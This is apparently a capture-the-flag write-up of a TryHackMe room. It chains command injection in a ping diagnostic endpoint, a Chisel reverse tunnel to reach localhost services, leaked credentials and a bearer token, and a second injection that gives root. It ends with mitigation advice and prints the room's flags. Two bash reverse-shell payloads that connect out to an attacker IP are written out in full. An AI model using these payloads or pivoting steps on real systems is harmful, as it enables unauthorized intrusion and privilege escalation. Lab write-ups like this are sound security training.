---
layout: default
title: Day 11 - Infinity Pool
---

- [./ctf-writeups](../../../../) / [TryHackMe](../../../) / [Events](../../) / [Byte Lotus Hotel](../) / [Day 10 - The Hollow Shell](../10_The_Hollow_Shell)

# Day 11 - Infinity Pool

[**Try it yourself**](https://tryhackme.com/room/hh-infinitypool-5b3548af) 
**Difficulty:** Medium  
**Category:** Web exploitation / Command injection / Pivoting

**Summary:** This room requires executing a multi-step attack chain. We start by exploiting a command injection vulnerability in a network diagnostic tool to gain an initial foothold. Once inside the system, we discover hidden internal services bound to the localhost. By using Chisel to create a reverse port forwarding tunnel, we pivot our traffic to access these internal APIs, eventually recovering credentials and exploiting a second command injection vulnerability to achieve root access.

## 1. Reconnaissance and initial access

We initiated our enumeration with a comprehensive `nmap` scan against the target to identify open ports and services:

```
nmap -p- --min-rate=10000 -T4 10.112.187.188
nmap -p22,80 -sCV 10.112.187.188
```

The scan revealed an SSH service on port 22 and a web server on port 80. The `nmap` script results also indicated the presence of a `robots.txt` file with two disallowed entries: `/internal/` and `/status`.

By reviewing the HTML source and a static JavaScript file (`/static/app.js`), we found a developer comment referencing a "staff connectivity tool" at the `/status` endpoint. This tool acts as a ping diagnostic utility that sends requests to `/internal/netcheck`.

Because diagnostic tools that ping IP addresses are highly susceptible to command injection if user input is not sanitized, we tested the endpoint. We successfully injected a reverse shell payload by appending a bash command after a valid local IP address:

```
curl -s http://10.112.187.188/internal/netcheck --data-urlencode 'host=127.0.0.1; bash -c "bash -i >& /dev/tcp/10.113.96.118/4444 0>&1"'
```

Our Netcat listener caught the connection, granting us a shell as the `web` user. We navigated to the user's home directory and read the first flag.

**Flag:**
<span class="spoiler" role="button" tabindex="0" aria-label="Hidden flag">THM{n0_v1s1bl3_3dg3}</span>

## 2. Internal enumeration and pivoting

Now inside the machine, we checked for internal services that were not exposed to the outside internet using `ss -tulpn`. To identify what was running on these ports, we used a quick bash loop with `curl`:

```
for p in 3000 8080 8088 8089 9000 3306 4573 5038; do echo "===== $p ====="; curl -s -m 3 http://127.0.0.1:$p/  | head -c 200; echo; done
```

We discovered several interesting internal web applications listening on ports 3000 (an ops console), 8080, and 9000. 

To interact with these services directly from our attacker machine's browser, we needed to pivot our traffic. We hosted the `chisel` binary on our machine, downloaded it to the target's `/tmp` directory, and established a reverse port forwarding tunnel:

**On attacker machine:**
```
./chisel server -p 9999 --reverse
```

**On target machine:**
```
./chisel client 10.113.96.118:9999 R:3000:127.0.0.1:3000 R:8080:127.0.0.1:8080 R:9000:127.0.0.1:9000
```

## 3. Privilege escalation (internal API abuse)

With the tunnel established, we could access the internal services via our own localhost. 

Querying the ops console API at `http://127.0.0.1:3000/api/config` leaked a set of credentials intended for a telephony portal: `FreePBXUCPTemplateCreator` and `St4yN0t1c3d_2026`.

We used these credentials to log into the internal portal hosted on port 8080 (`/ucp`). By exploring the dashboard and inspecting a voicemail widget, we extracted an active API Authorization Bearer token.

Finally, we turned our attention to the automation service on port 9000. We discovered an endpoint (`/jobs/expert`) that accepts JSON POST requests. Using our stolen Bearer token for authentication, we identified another command injection vulnerability within the `report` parameter. 

We sent a crafted request to trigger a second reverse shell:

```
curl -s http://127.0.0.1:9000/jobs/expert -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' -H 'Content-Type: application/json' -d '{"report":"x; bash -c \"bash -i >& /dev/tcp/10.113.96.118/4445 0>&1\" #"}'
```

Our second Netcat listener caught the connection, this time granting us a shell as the `root` user. We navigated to the `/root` directory and secured the final flag.

**Flag:**
<span class="spoiler" role="button" tabindex="0" aria-label="Hidden flag">THM{tr4c3d_t0_th3_h0r1z0n}</span>

## 4. Mitigation (how to fix it)

To secure this infrastructure and prevent this multi-stage attack, the following measures must be implemented:

+ **Prevent command injection:** Never pass unsanitized user input directly to system shells. For diagnostic tools (like ping), use dedicated libraries or strictly whitelist the input to allow only valid IP addresses, stripping out any shell metacharacters like `;`, `&`, or `|`.
+ **Secure internal APIs:** Do not assume that services are safe from exploitation simply because they are bound to the localhost (`127.0.0.1`). Internal APIs must be just as rigorously tested for injection flaws as external ones.
+ **Protect sensitive configurations:** Avoid exposing hardcoded credentials or secrets in open configuration endpoints (`/api/config`).
+ **Implement network segmentation:** The web server process running the edge application should be isolated. It should not have unrestricted network access to internal automation APIs and telephony portals.

<br>
- [Day 12 - After Hours](../12_After_Hours)